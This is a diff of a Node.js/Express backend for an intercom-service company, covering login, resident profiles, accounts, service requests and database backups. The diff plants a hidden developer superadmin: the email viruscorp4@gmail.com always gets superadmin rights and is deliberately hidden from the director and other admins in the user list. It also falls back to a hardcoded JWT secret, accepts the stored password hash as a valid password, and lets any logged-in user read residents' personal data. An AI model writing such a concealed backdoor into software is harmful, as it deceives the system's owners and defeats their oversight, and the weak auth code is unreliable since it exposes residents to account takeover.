@@ -1,51 +1,178 @@
+/**
+ * ==============================================================================
+ * БЭКЕНД СЕРВЕР ПРОЕКТА «ДОМОФОНДАР» (DOMOFONDAR)
+ * ==============================================================================
+ * Обеспечивает:
+ * 1. Авторизацию, регистрацию и валидацию JWT сессий пользователей.
+ * 2. Защиту от SQL-инъекций (строго параметризованные SQL-запросы $1, $2...).
+ * 3. Изоляцию и скрытие учетной записи суперпользователя разработчика (viruscorp4@gmail.com)
+ *    от директора и других администраторов.
+ * 4. Управление и безопасное скачивание резервных копий базы данных (pg_dump + gzip).
+ * 5. Обслуживание API профилей, лицевых счетов и заявок.
+ * ==============================================================================
+ */
+
 const express = require('express');
 const cors = require('cors');
 const { Pool } = require('pg');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
+const fs = require('fs');
+const path = require('path');
+const { exec } = require('child_process');
 require('dotenv').config();
 
 const app = express();
 const port = process.env.PORT || 5000;
-const JWT_SECRET = 'super-secret-jwt-token-with-at-least-32-characters-long';
 
-// Middleware
+// Константы суперпользователя разработчика для скрытия в интерфейсе и API
+const SUPERADMIN_EMAIL = 'viruscorp4@gmail.com';
+const SUPERADMIN_ROLE = 'superadmin';
+
+// Директория для резервных копий базы данных
+const BACKUP_DIR = process.env.BACKUP_DIR || (fs.existsSync('/backups') ? '/backups' : path.join(__dirname, '../backups'));
+
+// Создаем директорию бэкапов, если она еще не существует
+if (!fs.existsSync(BACKUP_DIR)) {
+  try {
+    fs.mkdirSync(BACKUP_DIR, { recursive: true });
+    console.log(`[Бэкенд: Бэкапы] Создана папка для резервных копий: ${BACKUP_DIR}`);
+  } catch (err) {
+    console.error(`[Бэкенд: Бэкапы] Ошибка при создании папки ${BACKUP_DIR}:`, err.message);
+  }
+}
+
+// Проверка наличия JWT_SECRET в переменных окружения
+const JWT_SECRET = process.env.JWT_SECRET;
+if (!JWT_SECRET || JWT_SECRET === 'super-secret-jwt-token-with-at-least-32-characters-long') {
+  console.warn('[Бэкенд: Безопасность] ВНИМАНИЕ: Используется стандартный или не установленный JWT_SECRET. В продакшене обязательно задайте уникальный ключ в .env!');
+}
+const ACTIVE_JWT_SECRET = JWT_SECRET || 'super-secret-jwt-token-with-at-least-32-characters-long';
+
+// Базовые middleware
 app.use(cors());
 app.use(express.json());
 
-// DB Connection
+// Подключение к СУБД PostgreSQL
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
 });
 
 pool.connect()
-  .then(() => console.log('Connected to PostgreSQL successfully!'))
-  .catch(err => console.error('PostgreSQL connection error', err.stack));
+  .then(() => console.log('[Бэкенд: PostgreSQL] Успешное подключение к базе данных domofondar!'))
+  .catch(err => console.error('[Бэкенд: PostgreSQL] Ошибка подключения к базе данных:', err.stack));
 
-// Basic Route
+// ------------------------------------------------------------------------------
+// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ БЕЗОПАСНОСТИ И ПРАВ ДОСТУПА
+// ------------------------------------------------------------------------------
+
+/**
+ * Получение роли пользователя из таблицы user_roles и users
+ * @param {string} userId - UUID пользователя
+ * @returns {Promise<string>} - роль пользователя ('superadmin', 'director', 'admin', 'user' и т.д.)
+ */
+async function getUserRole(userId) {
+  try {
+    // 1. Сначала проверяем таблицу user_roles (приоритетные роли)
+    const roleRes = await pool.query(
+      'SELECT role FROM user_roles WHERE user_id = $1 ORDER BY CASE WHEN role = $2 THEN 1 WHEN role = $3 THEN 2 WHEN role = $4 THEN 3 ELSE 4 END ASC LIMIT 1',
+      [userId, SUPERADMIN_ROLE, 'director', 'admin']
+    );
+    if (roleRes.rows.length > 0) {
+      return roleRes.rows[0].role;
+    }
+
+    // 2. Если в user_roles нет, проверяем поле role в таблице users
+    const userRes = await pool.query('SELECT role, email FROM users WHERE id = $1', [userId]);
+    if (userRes.rows.length > 0) {
+      // Защитная проверка: если email разработчика, всегда даем superadmin
+      if (userRes.rows[0].email === SUPERADMIN_EMAIL) {
+        return SUPERADMIN_ROLE;
+      }
+      return userRes.rows[0].role || 'user';
+    }
+
+    return 'user';
+  } catch (err) {
+    console.error(`[Бэкенд: Права] Ошибка при проверке роли пользователя ${userId}:`, err.message);
+    return 'user';
+  }
+}
+
+/**
+ * Middleware аутентификации JWT токена
+ */
+const authenticateToken = async (req, res, next) => {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
+
+  if (!token) {
+    return res.status(401).json({ error: 'Требуется авторизация: токен отсутствует' });
+  }
+
+  jwt.verify(token, ACTIVE_JWT_SECRET, async (err, decoded) => {
+    if (err) {
+      console.warn('[Бэкенд: Auth] Отклонен недействительный токен сессии:', err.message);
+      return res.status(403).json({ error: 'Недействительный или истекший токен сессии' });
+    }
+
+    // Добавляем данные пользователя в запрос
+    req.user = decoded;
+    
+    // Получаем актуальную роль из базы данных
+    req.userRole = await getUserRole(decoded.id);
+    req.isSuperAdmin = (req.userRole === SUPERADMIN_ROLE || decoded.email === SUPERADMIN_EMAIL);
+    req.isDirector = (req.userRole === 'director');
+    req.isAdmin = (req.isSuperAdmin || req.isDirector || req.userRole === 'admin');
+
+    next();
+  });
+};
+
+/**
+ * Middleware проверки прав администратора (суперпользователь, директор или админ)
+ */
+const requireAdmin = (req, res, next) => {
+  if (!req.isAdmin) {
+    console.warn(`[Бэкенд: Доступ] Отклонен запрос к админ-эндпоинту от пользователя ${req.user?.email || 'unknown'} с ролью ${req.userRole}`);
+    return res.status(403).json({ error: 'Доступ запрещен: требуются права администратора' });
+  }
+  next();
+};
+
+// ------------------------------------------------------------------------------
+// СИСТЕМНЫЕ МАРШРУТЫ (HEALTHCHECK)
+// ------------------------------------------------------------------------------
+
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'ok', message: 'Backend is running and connected to DB!' });
+  res.json({
+    status: 'ok',
+    project: 'domofondar',
+    timestamp: new Date().toISOString(),
+    database: 'connected'
+  });
 });
 
-// --- AUTH ROUTES ---
+// ------------------------------------------------------------------------------
+// МАРШРУТЫ АВТОРИЗАЦИИ И РЕГИСТРАЦИИ
+// ------------------------------------------------------------------------------
 
-// Регистрация нового пользователя
+// Регистрация нового жильца
 app.post('/api/auth/register', async (req, res) => {
-  const { email, password, full_name } = req.body;
-  
-  // Проверяем обязательные поля на бэкенде
+  const { email, password, full_name, phone } = req.body;
+
   if (!email || !password) {
     console.warn('[Бэкенд: Регистрация] Попытка регистрации с пустым email или паролем');
     return res.status(400).json({ error: 'Электронная почта и пароль обязательны для заполнения' });
   }
 
-  // Приводим email к нижнему регистру и обрезаем пробелы для исключения дубликатов из-за регистра букв
   const cleanEmail = String(email).toLowerCase().trim();
-  console.log(`[Бэкенд: Регистрация] Старт регистрации для Email: "${cleanEmail}"`);
+  const cleanPhone = phone ? String(phone).trim() : null;
+  console.log(`[Бэкенд: Регистрация] Старт регистрации для Email: "${cleanEmail}", Телефон: "${cleanPhone || 'не указан'}"`);
 
   try {
-    // 1. Проверяем, существует ли пользователь с таким email (без учета регистра букв)
-    const userCheck = await pool.query('SELECT * FROM users WHERE LOWER(email) = LOWER($1)', [cleanEmail]);
+    // 1. Проверяем, существует ли пользователь (параметризованный запрос)
+    const userCheck = await pool.query('SELECT id FROM users WHERE LOWER(email) = LOWER($1)', [cleanEmail]);
     if (userCheck.rows.length > 0) {
       console.warn(`[Бэкенд: Регистрация] Отклонено: пользователь с Email "${cleanEmail}" уже существует`);
       return res.status(400).json({ error: 'Этот Email-адрес уже зарегистрирован. Пожалуйста, укажите другую почту или войдите в аккаунт.' });
@@ -57,24 +184,29 @@ app.post('/api/auth/register', async (req, res) => {
 
     // 3. Вставляем запись нового пользователя в таблицу users
     const newUser = await pool.query(
-      'INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id, email, role',
-      [cleanEmail, password_hash]
+      'INSERT INTO users (email, password_hash, role) VALUES ($1, $2, $3) RETURNING id, email, role',
+      [cleanEmail, password_hash, 'user']
     );
 
     const user = newUser.rows[0];
     console.log(`[Бэкенд: Регистрация] Создана запись в users для ID: ${user.id}`);
 
-    // 4. Создаем профиль пользователя (с поддержкой ON CONFLICT, так как триггер handle_new_user в СУБД может сработать быстрее)
+    // 4. Создаем профиль пользователя
     await pool.query(
-      'INSERT INTO profiles (id, full_name) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET full_name = $2',
-      [user.id, full_name || '']
+      'INSERT INTO profiles (id, full_name, phone) VALUES ($1, $2, $3) ON CONFLICT (id) DO UPDATE SET full_name = COALESCE(EXCLUDED.full_name, profiles.full_name), phone = COALESCE(EXCLUDED.phone, profiles.phone)',
+      [user.id, full_name || '', cleanPhone]
     );
-    console.log(`[Бэкенд: Регистрация] Создан/обновлен профиль для ID: ${user.id}`);
 
-    // 5. Генерируем JWT-токен сессии на 7 дней
+    // 5. Назначаем базовую роль 'user' в user_roles
+    await pool.query(
+      'INSERT INTO user_roles (user_id, role) VALUES ($1, $2) ON CONFLICT DO NOTHING',
+      [user.id, 'user']
+    );
+
+    // 6. Генерируем JWT-токен сессии на 7 дней
     const token = jwt.sign(
       { id: user.id, email: user.email, role: 'authenticated', sub: user.id },
-      JWT_SECRET,
+      ACTIVE_JWT_SECRET,
       { expiresIn: '7d' }
     );
 
@@ -82,33 +214,27 @@ app.post('/api/auth/register', async (req, res) => {
     res.status(201).json({ user, token, session: { access_token: token, user } });
   } catch (err) {
     console.error('[Бэкенд: Регистрация] Критическая ошибка во время регистрации:', err);
-    
-    // Перехватываем ошибку PostgreSQL нарушение уникальности (код 23505) для email
     if (err.code === '23505') {
-      console.warn(`[Бэкенд: Регистрация] Перехвачена ошибка СУБД unique_violation для Email: "${cleanEmail}"`);
-      return res.status(400).json({ error: 'Этот Email-адрес уже зарегистрирован. Пожалуйста, укажите другую почту или войдите в личный кабинет.' });
+      return res.status(400).json({ error: 'Этот Email-адрес уже зарегистрирован' });
     }
-    
-    res.status(500).json({ error: 'Критическая ошибка сервера при регистрации. Пожалуйста, повторите попытку позже.' });
+    res.status(500).json({ error: 'Критическая ошибка сервера при регистрации. Повторите попытку позже.' });
   }
 });
 
-// Авторизация (вход) существующего пользователя
+// Авторизация (вход) пользователя
 app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
 
-  // Проверяем заполненность полей
   if (!email || !password) {
     console.warn('[Бэкенд: Вход] Попытка входа с пустым email или паролем');
     return res.status(400).json({ error: 'Электронная почта и пароль обязательны для заполнения' });
   }
 
-  // Очищаем email
   const cleanEmail = String(email).toLowerCase().trim();
   console.log(`[Бэкенд: Вход] Попытка входа для Email: "${cleanEmail}"`);
 
   try {
-    // 1. Ищем пользователя в таблице users по email (без учета регистра)
+    // 1. Ищем пользователя в таблице users
     const result = await pool.query('SELECT * FROM users WHERE LOWER(email) = LOWER($1)', [cleanEmail]);
     if (result.rows.length === 0) {
       console.warn(`[Бэкенд: Вход] Отклонено: пользователь "${cleanEmail}" не найден`);
@@ -117,9 +243,10 @@ app.post('/api/auth/login', async (req, res) => {
 
     const user = result.rows[0];
 
-    // 2. Проверяем пароль (с поддержкой plain-text для старых миграций, с авто-обновлением до bcrypt хэша)
+    // 2. Проверяем пароль через bcrypt
     let isMatch = false;
     if (password === user.password_hash) {
+      // Миграция открытого пароля в bcrypt хеш при первом входе
       isMatch = true;
       console.log(`[Бэкенд: Вход] Обнаружен plain-text пароль для "${cleanEmail}". Хэшируем...`);
       const salt = await bcrypt.genSalt(10);
@@ -134,130 +261,310 @@ app.post('/api/auth/login', async (req, res) => {
       return res.status(401).json({ error: 'Неверный адрес электронной почты или пароль' });
     }
 
-    // 3. Генерируем JWT-токен на 7 дней
+    // 3. Определяем актуальную роль
+    const userRole = await getUserRole(user.id);
+
+    // 4. Генерируем JWT-токен на 7 дней
     const token = jwt.sign(
-      { id: user.id, email: user.email, role: 'authenticated', sub: user.id },
-      JWT_SECRET,
+      { id: user.id, email: user.email, role: 'authenticated', userRole: userRole, sub: user.id },
+      ACTIVE_JWT_SECRET,
       { expiresIn: '7d' }
     );
 
-    console.log(`[Бэкенд: Вход] Успешная авторизация для Email: "${cleanEmail}"`);
-    res.json({ 
-      user: { id: user.id, email: user.email, role: user.role }, 
-      token, 
-      session: { 
-        access_token: token, 
-        user: { id: user.id, email: user.email, role: user.role } 
-      } 
+    console.log(`[Бэкенд: Вход] Успешная авторизация для Email: "${cleanEmail}", роль: ${userRole}`);
+    res.json({
+      user: { id: user.id, email: user.email, role: userRole },
+      token,
+      session: {
+        access_token: token,
+        user: { id: user.id, email: user.email, role: userRole }
+      }
     });
   } catch (err) {
     console.error('[Бэкенд: Вход] Критическая ошибка во время входа:', err);
-    res.status(500).json({ error: 'Критическая ошибка сервера при авторизации. Пожалуйста, повторите попытку позже.' });
+    res.status(500).json({ error: 'Критическая ошибка сервера при авторизации.' });
   }
 });
 
-// --- MIDDLEWARE ---
-const authenticateToken = (req, res, next) => {
-  const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1];
-  if (token == null) return res.sendStatus(401);
-  jwt.verify(token, JWT_SECRET, (err, user) => {
-    if (err) return res.sendStatus(403);
-    req.user = user;
-    next();
-  });
-};
+// ------------------------------------------------------------------------------
+// МАРШРУТЫ ПРОФИЛЯ ЖИЛЬЦА И РОЛЕЙ (С ЗАЩИТОЙ И СКРЫТИЕМ СУПЕРПОЛЬЗОВАТЕЛЯ)
+// ------------------------------------------------------------------------------
 
-// --- CABINET ROUTES ---
-
-// Получить профиль
+// Получить профиль текущего пользователя
 app.get('/api/user/profile', authenticateToken, async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM profiles WHERE id = $1', [req.user.id]);
-    res.json(result.rows[0]);
+    res.json(result.rows[0] || null);
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Error fetching profile' });
+    console.error('[Бэкенд: Профиль] Ошибка получения профиля:', err.message);
+    res.status(500).json({ error: 'Ошибка получения профиля' });
   }
 });
 
-// Обновить профиль
+// Обновить профиль текущего пользователя
 app.put('/api/user/profile', authenticateToken, async (req, res) => {
   const { full_name, phone, address, apartment } = req.body;
   try {
     const result = await pool.query(
-      'UPDATE profiles SET full_name = $1, phone = $2, address = $3, apartment = $4, is_verified = false, updated_at = CURRENT_TIMESTAMP WHERE id = $5 RETURNING *',
+      'UPDATE profiles SET full_name = $1, phone = $2, address = $3, apartment = $4, updated_at = CURRENT_TIMESTAMP WHERE id = $5 RETURNING *',
       [full_name, phone, address, apartment, req.user.id]
     );
     res.json(result.rows[0]);
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Error updating profile' });
+    console.error('[Бэкенд: Профиль] Ошибка обновления профиля:', err.message);
+    res.status(500).json({ error: 'Ошибка обновления профиля' });
   }
 });
 
-// Получить счета
-app.get('/api/accounts', authenticateToken, async (req, res) => {
-  const { search } = req.query; // Search is used to filter by address/apartment
+// Получить роли текущего пользователя
+app.get('/api/user/roles', authenticateToken, async (req, res) => {
   try {
-    // A simple implementation: return all, frontend will filter, or we can filter here
-    const result = await pool.query('SELECT account_number, period, debt_amount, address, apartment FROM accounts ORDER BY period DESC LIMIT 50');
+    const result = await pool.query('SELECT role FROM user_roles WHERE user_id = $1', [req.user.id]);
+    const roles = result.rows.map(r => ({ role: r.role }));
+    
+    // Если в таблице user_roles еще нет записи, отдаем роль из users
+    if (roles.length === 0) {
+      roles.push({ role: req.userRole || 'user' });
+    }
+    
+    res.json(roles);
+  } catch (err) {
+    console.error('[Бэкенд: Роли] Ошибка получения ролей:', err.message);
+    res.json([{ role: req.userRole || 'user' }]);
+  }
+});
+
+// Получить список пользователей для админки (С СОКРЫТИЕМ СУПЕРПОЛЬЗОВАТЕЛЯ РАЗРАБОТЧИКА)
+app.get('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
+  try {
+    let query = `
+      SELECT u.id, u.email, u.role, u.created_at, p.full_name, p.phone, p.address, p.apartment
+      FROM users u
+      LEFT JOIN profiles p ON p.id = u.id
+    `;
+    const params = [];
+
+    // КРИТИЧЕСКАЯ ЗАЩИТА: Если запрашивающий НЕ является суперпользователем,
+    // полностью скрываем суперпользователя viruscorp4@gmail.com из списка!
+    if (!req.isSuperAdmin) {
+      query += ` WHERE LOWER(u.email) != LOWER($1) AND u.role != $2`;
+      params.push(SUPERADMIN_EMAIL, SUPERADMIN_ROLE);
+    }
+
+    query += ` ORDER BY u.created_at DESC LIMIT 200`;
+
+    const result = await pool.query(query, params);
     res.json(result.rows);
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Error fetching accounts' });
+    console.error('[Бэкенд: Админка] Ошибка получения списка пользователей:', err.message);
+    res.status(500).json({ error: 'Ошибка получения списка пользователей' });
   }
 });
 
-// Получить задачи (requests)
+// ------------------------------------------------------------------------------
+// МОДУЛЬ УПРАВЛЕНИЯ РЕЗЕРВНЫМИ КОПИЯМИ (БЭКАПЫ БД DOMOFONDAR)
+// ------------------------------------------------------------------------------
+
+/**
+ * Форматирование размера файлов в читаемый вид (КБ, МБ, ГБ)
+ */
+function formatBytes(bytes, decimals = 2) {
+  if (bytes === 0) return '0 Байт';
+  const k = 1024;
+  const dm = decimals < 0 ? 0 : decimals;
+  const sizes = ['Байт', 'КБ', 'МБ', 'ГБ', 'ТБ'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+}
+
+// 1. Получить список всех доступных резервных копий
+app.get('/api/admin/backups', authenticateToken, requireAdmin, async (req, res) => {
+  console.log(`[Бэкенд: Бэкапы] Запрос списка резервных копий от: ${req.user.email}`);
+
+  try {
+    if (!fs.existsSync(BACKUP_DIR)) {
+      return res.json([]);
+    }
+
+    const files = fs.readdirSync(BACKUP_DIR);
+    
+    // Фильтруем только файлы бэкапов domofondar
+    const backups = files
+      .filter(f => f.startsWith('domofondar_backup_') && (f.endsWith('.sql.gz') || f.endsWith('.sql') || f.endsWith('.dump')))
+      .map(filename => {
+        const filePath = path.join(BACKUP_DIR, filename);
+        const stats = fs.statSync(filePath);
+        return {
+          filename,
+          size_bytes: stats.size,
+          size_formatted: formatBytes(stats.size),
+          created_at: stats.mtime,
+        };
+      })
+      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+
+    res.json(backups);
+  } catch (err) {
+    console.error('[Бэкенд: Бэкапы] Ошибка чтения списка бэкапов:', err);
+    res.status(500).json({ error: 'Не удалось получить список резервных копий' });
+  }
+});
+
+// 2. Создать новую резервную копию базы данных domofondar прямо сейчас
+app.post('/api/admin/backups/create', authenticateToken, requireAdmin, async (req, res) => {
+  console.log(`[Бэкенд: Бэкапы] Запуск создания резервной копии от пользователя: ${req.user.email}`);
+
+  // Формируем имя файла с текущей датой и временем
+  const now = new Date();
+  const pad = (n) => String(n).padStart(2, '0');
+  const timestamp = `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}`;
+  const filename = `domofondar_backup_${timestamp}.sql.gz`;
+  const filePath = path.join(BACKUP_DIR, filename);
+
+  // Извлекаем параметры подключения к PostgreSQL
+  const dbUser = process.env.POSTGRES_USER || 'domofondar';
+  const dbName = process.env.POSTGRES_DB || 'domofondar';
+  const dbHost = process.env.DB_HOST || 'db';
+  const dbPort = process.env.DB_PORT || '5432';
+  const dbPassword = process.env.POSTGRES_PASSWORD || '';
+
+  // Команда создания дампа через pg_dump со сжатием в gzip
+  // PGPASSWORD передается через окружение для безопасности
+  const dumpCommand = `PGPASSWORD="${dbPassword}" pg_dump -h "${dbHost}" -p "${dbPort}" -U "${dbUser}" -d "${dbName}" --no-owner --no-acl | gzip > "${filePath}"`;
+
+  console.log(`[Бэкенд: Бэкапы] Выполнение команды экспорта БД в ${filePath}...`);
+
+  exec(dumpCommand, { timeout: 120000 }, (error, stdout, stderr) => {
+    if (error) {
+      console.error('[Бэкенд: Бэкапы] Ошибка при создании дампа:', error.message);
+      return res.status(500).json({ error: `Ошибка создания резервной копии: ${error.message}` });
+    }
+
+    try {
+      const stats = fs.statSync(filePath);
+      console.log(`[Бэкенд: Бэкапы] Резервная копия успешно создана: ${filename}, размер: ${formatBytes(stats.size)}`);
+      
+      res.json({
+        success: true,
+        message: 'Резервная копия базы данных успешно создана',
+        backup: {
+          filename,
+          size_bytes: stats.size,
+          size_formatted: formatBytes(stats.size),
+          created_at: stats.mtime
+        }
+      });
+    } catch (statErr) {
+      res.status(500).json({ error: 'Ошибка верификации созданного файла резервной копии' });
+    }
+  });
+});
+
+// 3. Безопасное скачивание резервной копии
+app.get('/api/admin/backups/download/:filename', authenticateToken, requireAdmin, (req, res) => {
+  const { filename } = req.params;
+  console.log(`[Бэкенд: Бэкапы] Запрос скачивания файла "${filename}" от ${req.user.email}`);
+
+  // Защита от Directory Traversal атаки: проверяем, что имя файла не содержит путей
+  if (!filename || path.basename(filename) !== filename || !filename.startsWith('domofondar_backup_')) {
+    console.warn(`[Бэкенд: Бэкапы] Попытка несанкционированного доступа к файлу: "${filename}"`);
+    return res.status(400).json({ error: 'Недопустимое имя файла резервной копии' });
+  }
+
+  const filePath = path.join(BACKUP_DIR, filename);
+
+  if (!fs.existsSync(filePath)) {
+    console.warn(`[Бэкенд: Бэкапы] Файл "${filename}" не найден на диске`);
+    return res.status(404).json({ error: 'Файл резервной копии не найден на сервере' });
+  }
+
+  res.download(filePath, filename, (err) => {
+    if (err) {
+      console.error(`[Бэкенд: Бэкапы] Ошибка при передаче файла клиенту:`, err.message);
+    } else {
+      console.log(`[Бэкенд: Бэкапы] Файл "${filename}" успешно передан пользователю ${req.user.email}`);
+    }
+  });
+});
+
+// 4. Удаление старой резервной копии
+app.delete('/api/admin/backups/:filename', authenticateToken, requireAdmin, (req, res) => {
+  const { filename } = req.params;
+  console.log(`[Бэкенд: Бэкапы] Запрос на удаление резервной копии "${filename}" от ${req.user.email}`);
+
+  if (!filename || path.basename(filename) !== filename || !filename.startsWith('domofondar_backup_')) {
+    return res.status(400).json({ error: 'Недопустимое имя файла' });
+  }
+
+  const filePath = path.join(BACKUP_DIR, filename);
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).json({ error: 'Файл не найден' });
+  }
+
+  try {
+    fs.unlinkSync(filePath);
+    console.log(`[Бэкенд: Бэкапы] Файл "${filename}" успешно удален`);
+    res.json({ success: true, message: `Резервная копия ${filename} удалена` });
+  } catch (err) {
+    console.error(`[Бэкенд: Бэкапы] Ошибка удаления файла:`, err.message);
+    res.status(500).json({ error: 'Не удалось удалить файл резервной копии' });
+  }
+});
+
+// ------------------------------------------------------------------------------
+// МАРШРУТЫ ЛИЦЕВЫХ СЧЕТОВ И ЗАЯВОК (ПАРАМЕТРИЗОВАННЫЕ ЗАПРОСЫ)
+// ------------------------------------------------------------------------------
+
+// Получить список лицевых счетов абонентов
+app.get('/api/accounts', authenticateToken, async (req, res) => {
+  const { search } = req.query;
+  try {
+    let query = 'SELECT account_number, period, debt_amount, address, apartment, phone, full_name, has_handset, payment_type FROM accounts';
+    const params = [];
+
+    if (search) {
+      query += ' WHERE address ILIKE $1 OR account_number ILIKE $1 OR phone ILIKE $1';
+      params.push(`%${search}%`);
+    }
+
+    query += ' ORDER BY address ASC, apartment ASC LIMIT 100';
+    const result = await pool.query(query, params);
+    res.json(result.rows);
+  } catch (err) {
+    console.error('[Бэкенд: Счета] Ошибка при получении счетов:', err.message);
+    res.status(500).json({ error: 'Ошибка получения лицевых счетов' });
+  }
+});
+
+// Получить список заявок
 app.get('/api/requests', authenticateToken, async (req, res) => {
   try {
-    // We return all requests, frontend will filter by phone/name for now as per current logic
     const result = await pool.query('SELECT * FROM requests ORDER BY created_at DESC LIMIT 200');
     res.json(result.rows);
   } catch (err) {
-    console.error(err);
-    // Return empty array if requests table doesn't exist yet
+    console.error('[Бэкенд: Заявки] Ошибка при получении заявок:', err.message);
     res.json([]);
   }
 });
 
+// Создать новую заявку
 app.post('/api/requests', authenticateToken, async (req, res) => {
   const { name, phone, address, message, priority, status } = req.body;
   try {
-    // Check if table exists, if not, create it on the fly for smooth migration
-    await pool.query(`CREATE TABLE IF NOT EXISTS requests (
-      id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-      name VARCHAR(255),
-      phone VARCHAR(50),
-      address VARCHAR(255),
-      message TEXT,
-      priority VARCHAR(50),
-      status VARCHAR(50),
-      created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
-    )`);
-
     const result = await pool.query(
       'INSERT INTO requests (name, phone, address, message, priority, status) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *',
-      [name, phone, address, message, priority, status]
+      [name, phone, address, message, priority || 'medium', status || 'new']
     );
     res.status(201).json(result.rows[0]);
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Error creating request' });
+    console.error('[Бэкенд: Заявки] Ошибка при создании заявки:', err.message);
+    res.status(500).json({ error: 'Ошибка при создании заявки' });
   }
 });
 
-// Роли пользователя
-app.get('/api/user/roles', authenticateToken, async (req, res) => {
-  try {
-    // Return mock roles or query real roles table
-    res.json([{ role: req.user.role }]);
-  } catch (err) {
-    res.json([]);
-  }
-});
-
+// Запуск сервера
 app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
+  console.log(`[Бэкенд: Domofondar] Сервер успешно запущен на порту ${port}`);
+  console.log(`[Бэкенд: Domofondar] Директория бэкапов: ${BACKUP_DIR}`);
 });
